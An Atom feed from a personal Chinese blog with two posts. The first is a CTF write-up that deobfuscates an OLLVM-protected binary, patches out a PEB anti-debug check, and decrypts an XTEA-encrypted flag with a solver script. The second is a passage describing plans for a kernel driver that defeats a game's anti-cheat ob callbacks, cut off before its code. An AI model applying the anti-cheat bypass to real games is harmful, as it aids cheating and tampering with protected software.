<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Second_BC の BloG</title>
  
  
  <link href="https://secondbc.github.io/SecondBC/atom.xml" rel="self"/>
  
  <link href="https://secondbc.github.io/SecondBC/"/>
  <updated>2024-10-20T02:23:22.388Z</updated>
  <id>https://secondbc.github.io/SecondBC/</id>
  
  <author>
    <name>Second_BC</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024-强网拟态-easyre</title>
    <link href="https://secondbc.github.io/SecondBC/2024/10/20/2024-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-easyre/"/>
    <id>https://secondbc.github.io/SecondBC/2024/10/20/2024-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-easyre/</id>
    <published>2024-10-20T02:04:28.000Z</published>
    <updated>2024-10-20T02:23:22.388Z</updated>
    
    <content type="html"><![CDATA[<p>题目附件：<a href="https://pan.baidu.com/s/1qEbEZ_xdS33hOiExvLR7ng?pwd=3457">https://pan.baidu.com/s/1qEbEZ_xdS33hOiExvLR7ng?pwd=3457</a></p><p>一个exe程序，直接拖到ida里，发现没有main，很混乱，直接猜测上了自解密 + 混淆花指令；</p><p>根本看不到伪代码，硬啃汇编罢；</p><p><img src="https://s2.loli.net/2024/10/19/VeTkXKylxUfrWqR.png" alt="image.png"></p><p>不打算修，太多了，直接调，函数列表搜索scan，可以拿到库函数：</p><p><code>?scan_optional_field_width@?$format_string_parser@D@__crt_stdio_input@@AEAA_NXZ</code></p><p>在这个函数里打上断点，可以在输入内容的时候断下，然后一层一层的往上层函数断点测试：</p><p>可以找到最终的scanf调用实际上使用了下面这个函数：</p><p><code>??$?RV_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_@@AEAV_lambda_9a20e10065b92b5193c3597a66cba9d4_@@V_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_@@AEAV_lambda_9a20e10065b92b5193c3597a66cba9d4_@@$$QEAV_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_@@@Z_1</code></p><p>也是一个库函数，接着这个函数往下走，可以走到一个神奇的地方，我称之为中转站，也是找到虚拟机的特征，操作码一类的东西：</p><p><img src="https://s2.loli.net/2024/10/19/h69QaCwx1WGSEv3.png" alt="image.png"></p><p>这个rax实际上就是一个操作码，每次都有不同的功能，在前几次调试测试会发现，第一次调用call之后，就会打印wrong flag；</p><p>而当rip在这个地方的时候往栈上看，能发现我们输入的内容：</p><p><img src="https://s2.loli.net/2024/10/19/guGxCEmTjIkatDB.png" alt="image.png"></p><p>对着我们输入的地址按x查看引用能找到一个地方，调过去能发现这是第一次call会执行的，再次调试能够知道实际上是在调用strlen函数，它将strlen给到rax，然后call rax，过了中转站之后第二次call就会打印wrong flag：</p><p><img src="https://s2.loli.net/2024/10/19/jc6D9WgYsKzfvA3.png" alt="image.png"></p><p>对着strlen再继续跟下去会得知flag长度是56；</p><p>如果长度是正确的，第一次call完之后，剩下的call就开始循环了，貌似在操作输入的字符串；</p><p>通过每三次call，可以发现它是一个动作，每三次rdx都会加2，当加到70h之后变成新的循环；</p><p>实际上也就是以56为一个循环，一共要循环两次，但是调试的时候发现第一次循环没有对输入的内容做修改，而第二次循环会对输入的内容替换为用7F去减去它本身的值（通过观察栈上的值）；</p><p>这56长度的循环结束之后，会有一个短循环，一共call 26次，第25次就会输出wrong flag，第26次进入结束程序；</p><p>通过调试可以发现，这26次里面，在对输入的内容进行分组加密，每8字节为一组，应该是电码本模式，因为56个a加密的东西分组的很明显：</p><p><img src="https://s2.loli.net/2024/10/19/cXvBj8Ps3hnSLfd.png" alt="image.png"></p><p>对8个字节的分组加密部分也是3次call为一个动作，一共执行21次，把7个分组都加密完，剩下的4次call很可能就是用来进行判断的；</p><p>跟踪剩下的call可以发现很难看，很多都是没用的跳转，所以结合着打上内存断点，可以找到如下内容：</p><p><img src="https://s2.loli.net/2024/10/20/mPKyVRCYDH13l4J.png" alt="WTJ4QTO33P_YL308F_A~_CJ.png"></p><p><img src="https://s2.loli.net/2024/10/19/VXWgaQypjDBuNCT.png" alt="image.png"></p><p>它会依次获取加密后的输入数据，以及比较数据？这个比较数据每次都在变化，然后进行比较，通过调试改值，可以一路改下去，然后就能够使得程序输出right flag的字符串，打到这个时候其实已经就很有信心能出了；</p><p>为什么直接引用outandin地方的地址不能直接x获取到这些被引用的地方呢？</p><p>是因为这个混淆做了一个表，它每次要获取地址的时候，都是用代码段上的立即数去加或者减这个表里的无意义的数据，得到一个可用的地址，这样就防止了地址引用的查询，但是还是逃不过内存断点；</p><p>使用如下ida的python脚本进行更改比对值且输出比较内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ea=get_reg_value(<span class="string">&quot;r8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ea))</span><br><span class="line">set_reg_value(ea, <span class="string">&quot;rdx&quot;</span>)</span><br></pre></td></tr></table></figure><p>对打印的内容进行整理拿到如下比较hex：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BE <span class="number">44</span> 7B 02 BA <span class="number">95</span> 4B 8C E3 A8 F1 <span class="number">90</span> FB CD A4 3C 2F EE 9E <span class="number">68</span> <span class="number">79</span> AA 6D ED <span class="number">85</span> B0 <span class="number">77</span> 2F <span class="number">27</span> 3F <span class="number">41</span> FF 1F C1 CF <span class="number">43</span> AA <span class="number">00</span> AC FA <span class="number">71</span> <span class="number">43</span> <span class="number">57</span> 09 <span class="number">51</span> BA F7 B2 <span class="number">67</span> <span class="number">96</span> <span class="number">52</span> <span class="number">47</span> A0 <span class="number">50</span> <span class="number">40</span> C7</span><br></pre></td></tr></table></figure><p>现在要做的就是查看分组加密算法了，回到当时加密的部分，一步一步的跟踪看过去，发现程序会去操作两个寄存器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">算法逻辑：</span><br><span class="line"></span><br><span class="line">ecx 给到12345678h 异或 ffffffff 与上 4C4CDB01 -&gt; 4C488901 xor ffffffff -&gt; B3B776FE</span><br><span class="line"></span><br><span class="line">eax 给到12345678h 加上 B3B324FE 异或 ffffffff -&gt; EDCFFB87</span><br><span class="line"></span><br><span class="line">ecx = ecx &amp; eax = A1877286 = B3B776FE &amp; EDCFFB87</span><br><span class="line"></span><br><span class="line">eax = ecx = ecx xor <span class="number">0xffffffff</span> = 5E788D79</span><br><span class="line"></span><br><span class="line">eax xor <span class="number">0xffffffff</span> = A1877286</span><br><span class="line"></span><br><span class="line">ecx = ecx &amp; 4CD6DA30 xor <span class="number">0xffffffff</span> = B3AF77CF -&gt; 12AE5749 -&gt; EDD9AEF6</span><br><span class="line"></span><br><span class="line">eax = eax &amp; 0B32925CF xor <span class="number">0xffffffff</span> = 5EFEDF79 xor ffff -&gt; ED51A8B6 -&gt; 8C1128B0 -&gt; 61C88646 -&gt;9E3779B9</span><br></pre></td></tr></table></figure><p>那最终经过一段又臭又长的小丑代码膨胀之后，你会拿到eax会变成 0x9e3779b9；</p><p>包是tea里面的delta，弟弟；</p><p>通过进一步调试我能拿到如下栈帧内容：</p><p><img src="https://s2.loli.net/2024/10/19/6YiXu1FlkUAH7Kr.png" alt="image"></p><p>能够拿到key和轮次，那么直接把三个tea都拿来试，试完可以发现是xtea（不是tea和xxtea）；</p><p>写逆运算，直接拿到不可见字符，太棒了，我逐渐理解一切；</p><p>思考是否是因为有反调试在搞我，于是尝试用ida附加进程，发现附加不上，很大可能；</p><p>拿CE进行附加调试，可以发现最终的比较数据发生了变化，同时我们输入计算的结果也发生了变化（千万别用其他算法搞我）：</p><p><img src="https://s2.loli.net/2024/10/19/CtOgy8v3PQw9LVG.png" alt="image"></p><p>第一个思路是找idata段（iat表）用到了反调试的哪些函数，可以找到疑似的如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.idata:<span class="number">00007F</span>F704979060 <span class="number">20</span> <span class="number">7F</span> B1 DD F8 <span class="number">7F</span> <span class="number">00</span> <span class="number">00</span>       IsDebuggerPresent </span><br><span class="line">.idata:<span class="number">00007F</span>F704979038 <span class="number">00</span> <span class="number">11</span> B1 DD F8 <span class="number">7F</span> <span class="number">00</span> <span class="number">00</span>       GetSystemTimeAsFileTime</span><br></pre></td></tr></table></figure><p>对其进行x引用反查并下断点，能够发现不是他们的原因（不会断下来）；</p><p>接着对ida里进行search，搜索字节块，直接搜索hex 60 （对于静态反调试而言，PEB结构很重要，32位是fs:30 64位是gs:60）</p><p>然后在搜索的结果里ctrl+f筛选gs，果然给找到了：</p><p><img src="https://s2.loli.net/2024/10/19/sgH7oiZNAUzGcPW.png" alt="image.png"></p><p>之后在这里给下个断点，ida调试一启动程序就到这里来，先把eax改成0，然后把上面一条句子改成xor eax,eax nop nop；</p><p>就可以不用管这个地方了；</p><p>之后还是一样的调试，能够发现第一轮56长度循环的时候对输入做改动了，对输入的每个字节进行加40h，第二轮循环还是老样子，分组tea也是老样子（还好没变，变了我要把出题人给草草了），然后比较的数据也变了，内容就是ce里面的，说明ce附加调试是正确的数据，用之前的方法再提一遍数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1 e3 <span class="number">51</span> <span class="number">98</span> <span class="number">86</span> <span class="number">56</span> <span class="number">76</span> <span class="number">49</span> 6f 6b 2b <span class="number">81</span> cf ce <span class="number">12</span> <span class="number">96</span> a2 <span class="number">70</span> <span class="number">35</span> 3c <span class="number">31</span> <span class="number">62</span> 5c f1 fa <span class="number">77</span> 6b aa 9e 6d 05 be e8 <span class="number">24</span> a4 f8 db <span class="number">23</span> 3a 0b <span class="number">16</span> <span class="number">20</span> cc 03 ad b5 2b a9 <span class="number">34</span> 9f <span class="number">78</span> 1d 2e b9 f9 9e</span><br></pre></td></tr></table></figure><p>这次数据就是正确的了；</p><p>反思：拿到怪玩意儿先找反调试，不然后期恶心死我；</p><p>之后写脚本进行flag获取：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> DWORD;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">teaE</span><span class="params">(DWORD* EntryData, DWORD* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组</span></span><br><span class="line">    DWORD x = EntryData[<span class="number">0</span>];</span><br><span class="line">    DWORD y = EntryData[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    DWORD sum = <span class="number">0</span>;</span><br><span class="line">    DWORD delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="comment">//总共加密32轮</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x66</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d轮：v0: %x v1: %x\n&quot;</span>, i, x, y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后加密的结果重新写入到数组中</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xteaE</span><span class="params">(DWORD v[<span class="number">2</span>], DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    DWORD v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x66</span>; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        <span class="comment">//if (i == 0)</span></span><br><span class="line">            <span class="comment">//printf(&quot;%d轮：v0: %x v1: %x\n&quot;, i, v0, v1);</span></span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">   </span><br><span class="line">    rounds = <span class="number">0x66</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[p + <span class="number">1</span>];</span><br><span class="line">            z = v[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        <span class="keyword">if</span> (rounds == <span class="number">0x66</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d轮：v0: %x v1: %x\n&quot;</span>, rounds, y, z);</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面这三个都是在尝试</span></span><br><span class="line"><span class="comment">//比较数据</span></span><br><span class="line"><span class="comment">//unsigned int ans[14] = &#123;  假的，出生</span></span><br><span class="line"><span class="comment">//    0x027B44BE, 0x8C4B95BA, 0x90F1A8E3, 0x3CA4CDFB, 0x689EEE2F, 0xED6DAA79, 0x2F77B085, 0xFF413F27,</span></span><br><span class="line"><span class="comment">//   0x43CFC11F, 0xFAAC00AA, 0x09574371, 0xB2F7BA51, 0x47529667, 0xC74050A0</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans[<span class="number">14</span>] = &#123;</span><br><span class="line">    <span class="number">0x9851E3A1</span>, <span class="number">0x49765686</span>, <span class="number">0x812B6B6F</span>, <span class="number">0x9612CECF</span>, <span class="number">0x3C3570A2</span>, <span class="number">0xF15C6231</span>, <span class="number">0xAA6B77FA</span>, <span class="number">0xBE056D9E</span>,</span><br><span class="line">    <span class="number">0xF8A424E8</span>, <span class="number">0x0B3A23DB</span>, <span class="number">0x03CC2016</span>, <span class="number">0xA92BB5AD</span>, <span class="number">0x1D789F34</span>, <span class="number">0x9EF9B92E</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char ans[] = &quot;\xde\xde\xde\xde\xde\xde\xde\xde&quot;;</span></span><br><span class="line"><span class="comment">//DWORD res[] = &#123; 0x027B44BE ,0x8C4B95BA &#125;;</span></span><br><span class="line"><span class="comment">//DWORD k[4] = &#123; 2,2,3,4 &#125;;</span></span><br><span class="line"></span><br><span class="line">DWORD k[<span class="number">4</span>] = &#123; <span class="number">0xEF6FD9DB</span>, <span class="number">0xD2C273D3</span>, <span class="number">0x6F97E412</span>, <span class="number">0x72BFD624</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xteaD</span><span class="params">(DWORD v[<span class="number">2</span>], DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    DWORD v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * <span class="number">0x66</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x66</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// printf(&quot;%x %x\n&quot;, ((DWORD*)ans)[0], ((DWORD*)ans)[1]);</span></span><br><span class="line">    <span class="comment">//xteaE((DWORD*)ans,k);</span></span><br><span class="line">    <span class="comment">//xxtea((DWORD*)datas,2, k);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;%x %x\n&quot;, ((DWORD*)ans)[0], ((DWORD*)ans)[1]);</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">xteaD</span>((DWORD*)&amp;(((DWORD*)ans)[i]), k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* str = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">56</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">56</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">char</span>)((<span class="number">0x7f</span> - str[i])- <span class="number">0x40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%x&quot;, ans[2]);</span></span><br><span class="line">    <span class="comment">//DWORD sum = 0;</span></span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; 0x66; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    sum += DELTA;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//printf(&quot;%x&quot;, sum);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后拿到flag：flag{u_ar3_re@11y_g00d_@t_011vm_de0bf_and_anti_debugger}</p><p>草草了，ollvm，还是第一次见混淆之后的程序，太抽象了，有一种vmp的美，给我搞了一天，难绷；</p><p>根据flag可以知道有一个deobf的工具应该可以有效去除ollvm的混淆，之后可以研究来看看；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目附件：&lt;a href=&quot;https://pan.baidu.com/s/1qEbEZ_xdS33hOiExvLR7ng?pwd=3457&quot;&gt;https://pan.baidu.com/s/1qEbEZ_xdS33hOiExvLR7ng?pwd=3457&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://secondbc.github.io/SecondBC/categories/WriteUp/"/>
    
    
    <category term="Reverse" scheme="https://secondbc.github.io/SecondBC/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>驱动obcallback反附加的一次尝试</title>
    <link href="https://secondbc.github.io/SecondBC/2024/10/07/%E9%A9%B1%E5%8A%A8obcallback%E5%8F%8D%E9%99%84%E5%8A%A0%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/"/>
    <id>https://secondbc.github.io/SecondBC/2024/10/07/%E9%A9%B1%E5%8A%A8obcallback%E5%8F%8D%E9%99%84%E5%8A%A0%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/</id>
    <published>2024-10-07T08:06:43.000Z</published>
    <updated>2024-10-07T08:14:36.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起因是因为某手游用CE附加会发现无法附加上，那包括很多目前流行的游戏，steam也好，wegame也好基本上都是这个样子的；</p><p>在没有驱动编程知识的条件下盲人摸黑阶段，只有用r3的思路去揣测，是否是对进程，服务，等等内容进行遍历找CE的关键字段被检测到了，又或者调了一个Windows回调不停的遍历text段和关键部分看是否被篡改等等思考，当然用ida传统CTF逆向的方法去做很难，代码量太大，把文件扔进去ida自动扫描就要扫半天；</p><p>根据这些r3的思考也做过几次尝试，比如用魔改版的CE，比如写dll注入读数据，都没有结果，而且也不知道原因啊，卡了一段时间；</p><p>之后在b站刷视频，说是这个手游有一个驱动保护，权限高于用户层，那么去网上找了个system权限的ce工具，发现可以读写内存了，但是会被检测出来，游戏中途直接G掉，这个检测一时半会儿也找不出来，同时不能直接扣走这个驱动，它和游戏是一体的，扣走无法正常游戏；</p><p>后来看了一篇博客：<a href="https://blog.csdn.net/u011442768/article/details/109207144">https://blog.csdn.net/u011442768/article/details/109207144</a></p><p>里面分析了三种可能，同时这个文章用到了ark工具，我也下了个pc hunter来用，然后？然后整件事情就有了进展；</p><h2 id="PcHunter分析"><a href="#PcHunter分析" class="headerlink" title="PcHunter分析"></a>PcHunter分析</h2><p>就一个一个的找过去，能发现这几个地方：</p><p><img src="https://s2.loli.net/2024/10/07/N3BeOAqxtQKmYZX.png" alt="image.png"></p><p>有一说一pchunter真好用吧，这个比拿着ida在那瞎jb逆好多了；</p><p>所有回调都是这个保护驱动进行的，那思路首先应该是逆一下这个驱动，找关键的回调函数，我其实都想照着上面说的博客文章进行一步一步的试了，dump驱动的镜像内存，直接跳偏移去看这些函数，但是我发现了一个问题如下：</p><p><img src="https://s2.loli.net/2024/10/07/ELSbwtTPOZBCcqW.png" alt="image.png"></p><p>可能是我不太会dump吧，搞出来的镜像貌似是静态的，关键代码段都被内嵌的upx加密了，线索被断掉了（菜）；</p><p>花时间的话应该也能搞定dump这块，但之后的内容让我省了这一部分技术性的操作；</p><p>去必应搜索obcallback可以得到很多有用的东西，比如obcallback实际上会去操作OB_PRE_OPERATION_INFORMATION这个结构体，这个结构体是每个进程单独有的，里面有一个叫做 DesiredAccess 的字段，是影响进程读写内存等等权限的；</p><p>那之前是用SYSTEM级别权限的CE可以直接进行读写，是否可以猜测保护驱动展开的obcallback在一直给每个新开的进程读写内存降权，因为它的obcallback是在进程线程创建时会去调用；</p><p>根据这个猜测进行尝试，如果我在它的回调调用之后进行提权操作，那么就可以恢复读写权限；</p><p>用魔法打败魔法，它是驱动执行的ob回调，那么我们也写一个驱动来执行我的ob回调；</p><h2 id="编写驱动尝试"><a href="#编写驱动尝试" class="headerlink" title="编写驱动尝试"></a>编写驱动尝试</h2><p>去b站搜怎么写驱动啊，怎么让驱动调用obcallback，那也是给找着了；</p><p>首先还是用VS2022进行，但是需要安装SDK和WDK，同时这两个需要同样的版本号；</p><p>同时WDK需要和windows版本对应，为了使用支持VS2022版本的WDK还特别升级了Windows11 22H2进行和WDK进行匹配；</p><p>然后神奇的发现了电脑开机速度还变快了（ 别用垃圾win11 21h2</p><p>之后环境配好之后开始写驱动，实现的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 